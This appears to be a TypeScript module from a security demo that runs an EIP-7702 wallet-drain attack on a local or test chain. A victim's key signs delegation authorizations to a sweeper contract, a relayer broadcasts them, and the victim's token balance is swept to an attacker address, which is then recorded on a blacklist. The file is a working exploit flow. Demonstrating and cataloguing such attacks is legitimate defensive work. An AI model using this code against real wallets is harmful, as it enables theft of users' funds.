import { formatUnits, encodeFunctionData, keccak256, createPublicClient, createWalletClient, http, defineChain, type Hex } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { ERC20_ABI, SWEEPER_ABI } from "./abi";
import { arkivEnabled, recordDelegation, upsertDelegate } from "./arkiv";
import { chainConfig, WHITECHAIN_ID } from "./chains";
import type { Emit } from "./types";

const NUM_AUTHS = 50;
const DEC = 6;

// Real attack on anvil finishes in ~100ms — too fast to watch. Pace the stream so the
// sequence is presentable. The on-chain actions are unchanged; only the emit cadence is paced.
// Set ATTACK_PACE_MS=0 to disable (e.g. on Sepolia, where block times pace it naturally).
const PACE = Number(process.env.ATTACK_PACE_MS ?? 26);
const sleep = (ms: number) => (ms > 0 ? new Promise((r) => setTimeout(r, ms)) : Promise.resolve());

function env(k: string) {
  const v = process.env[k];
  if (!v) throw new Error(`Missing ${k} — run \`npm run setup\` (local) or configure .env (Sepolia).`);
  return v;
}

/**
 * The REAL Binance-style EIP-7702 attack. Executes on-chain against whatever
 * CHAIN_RPC/CHAIN_ID points at (local anvil by default, or Sepolia).
 *
 * The victim keeps its real on-chain balance between runs; funding is explicit
 * (the Deposit button). The relayer pays gas and broadcasts; the attacker +
 * contracts come from `npm run setup` / deploy.
 */
export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: number) {
  const E = (e: Parameters<Emit>[0]) => emit({ t: Date.now(), ...e });
  const abortIf = () => { if (signal?.aborted) throw new DOMException("aborted", "AbortError"); };

  // Per-network selection; unknown/omitted chain -> Whitechain. Contracts (token/sweeper/attacker)
  // come from the registry; the relayer and victim keys are shared across networks (from env).
  const net = chainConfig(chainId);
  const chain = defineChain({
    id: net.id, name: net.name,
    nativeCurrency: net.id === WHITECHAIN_ID ? { name: "WhiteBIT Coin", symbol: "WBT", decimals: 18 } : { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: { default: { http: [net.rpc] } },
  });
  const relayer = privateKeyToAccount(env("RELAYER_PK") as `0x${string}`);
  const victim = privateKeyToAccount(env("VICTIM_PK") as `0x${string}`); // fixed victim (persistent per chain)
  const attacker = net.attacker;
  const sweeper = net.sweeper;
  const tusd = net.token;

  const pub = createPublicClient({ chain, transport: http(net.rpc) });
  const wallet = createWalletClient({ account: relayer, chain, transport: http(net.rpc) });

  E({ step: "setup", msg: "Actors loaded", victim: victim.address, relayer: relayer.address, attacker, sweeper, tusd });

  // The wallet keeps whatever balance it has on-chain. Funding is an explicit user action
  // (the Deposit button → /api/mint), never a hidden mint at launch. If it's empty, there's
  // nothing to drain, so stop early and tell the user to top up first.
  const before = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
  if (before === 0n) {
    E({ step: "empty", msg: "The wallet is empty — press Deposit to add test tUSD, then launch the attack." });
    return;
  }
  E({ step: "before", msg: "Victim balance before attack", victimTUSD: formatUnits(before, DEC), attackerTUSD: "0" });
  abortIf();

  // 1 — sign 50 authorizations at consecutive nonces
  const start = await pub.getTransactionCount({ address: victim.address });
  E({ step: "sign", msg: `Victim current nonce is ${start}. Signing ${NUM_AUTHS} authorizations at nonces ${start}..${start + NUM_AUTHS - 1}`, victimNonce: start, numAuths: NUM_AUTHS });
  const auths = [];
  for (let i = 0; i < NUM_AUTHS; i++) {
    auths.push(await victim.signAuthorization({ contractAddress: sweeper, chainId: chain.id, nonce: start + i }));
    E({ step: "sign-progress", msg: `Signed authorization ${i + 1}/${NUM_AUTHS}`, index: i + 1, nonce: start + i });
    await sleep(PACE);
  }
  E({ step: "sign-done", msg: `All ${NUM_AUTHS} authorizations signed. Exactly one (nonce ${start}) matches and takes effect.`, matchingNonce: start });
  abortIf();
  await sleep(PACE * 14);

  // 2 — relayer broadcasts the delegation (victim nonce only advances via the authorization)
  E({ step: "delegate", msg: "Relayer broadcasting type-4 transaction carrying all 50 authorizations..." });
  const dHash = await wallet.sendTransaction({ authorizationList: auths, to: victim.address, data: "0x" });
  E({ step: "delegate-sent", msg: "Delegation tx sent", txHash: dHash });
  const dRc = await pub.waitForTransactionReceipt({ hash: dHash });
  E({ step: "delegate-mined", msg: "Delegation mined", block: Number(dRc.blockNumber), status: dRc.status });

  // Poll getCode until the read RPC reflects the delegation — public RPCs are eventually consistent,
  // so a confirmed receipt doesn't mean the next getCode shows the new code.
  let code = await pub.getCode({ address: victim.address });
  let delegated = !!code && code.toLowerCase().startsWith("0xef0100");
  for (let i = 0; i < 12 && !delegated; i++) {
    await sleep(1500);
    code = await pub.getCode({ address: victim.address });
    delegated = !!code && code.toLowerCase().startsWith("0xef0100");
  }
  E({ step: "verify", msg: delegated ? "Victim account is now DELEGATED to the sweeper (0xef0100 marker present)" : "No delegation marker found", delegated, code });
  if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
  abortIf();
  await sleep(PACE * 14);

  // 3 — drain
  E({ step: "sweep", msg: "Calling sweeper to drain victim tUSD to attacker..." });
  const sData = encodeFunctionData({ abi: SWEEPER_ABI, functionName: "sweepToken", args: [tusd] });
  const sHash = await wallet.sendTransaction({ to: victim.address, data: sData });
  E({ step: "sweep-sent", msg: "Sweep tx sent", txHash: sHash });
  const sRc = await pub.waitForTransactionReceipt({ hash: sHash });
  E({ step: "sweep-mined", msg: "Sweep mined", block: Number(sRc.blockNumber), status: sRc.status });

  const after = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
  const drained = before - after;
  E({ step: "after", msg: "Balances after attack", victimTUSD: formatUnits(after, DEC), attackerTUSD: formatUnits(drained, DEC), drained: formatUnits(drained, DEC) });

  // Record this delegation + the sweeper contract on Arkiv (The Blacklist). Best-effort.
  if (arkivEnabled()) {
    E({ step: "log", msg: "Recording delegation on Arkiv…" });
    const net = chain.id === 11155111 ? "sepolia" : chain.id === 31337 ? "local" : `chain-${chain.id}`;
    const now = String(Date.now());
    const key = await recordDelegation({
      chain: net, victim: victim.address, delegate: sweeper, attacker, token: tusd,
      drained: formatUnits(drained, DEC), delegateTx: dHash, sweepTx: sHash,
      block: String(sRc.blockNumber), status: "drained", ts: now,
    });
    const sweeperCode = (code ?? "0x") as Hex;
    await upsertDelegate({
      chain: net, address: sweeper, bytecodeHash: keccak256(sweeperCode), label: "suspicious",
      labelSource: "chainwall-demo: forwards entire balance to one hardcoded address",
      delegatorCount: "1", firstSeenBlock: String(dRc.blockNumber), ts: now,
    });
    if (key) E({ step: "arkiv", msg: "Recorded on Arkiv", arkivKey: key });
  }

  E({ step: "done", msg: "Attack complete.", txHash: sHash });
}
